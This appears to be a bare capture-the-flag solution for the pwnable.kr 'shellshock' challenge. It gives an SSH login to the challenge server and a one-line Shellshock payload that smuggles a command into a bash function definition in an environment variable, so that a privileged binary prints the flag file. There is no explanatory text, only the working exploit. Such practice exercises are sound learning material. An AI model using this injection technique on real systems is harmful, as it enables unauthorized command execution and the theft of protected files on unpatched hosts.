ssh shellshock@pwnable.kr -p2222
env x='() { :;}; /bin/cat flag' ./shellshock
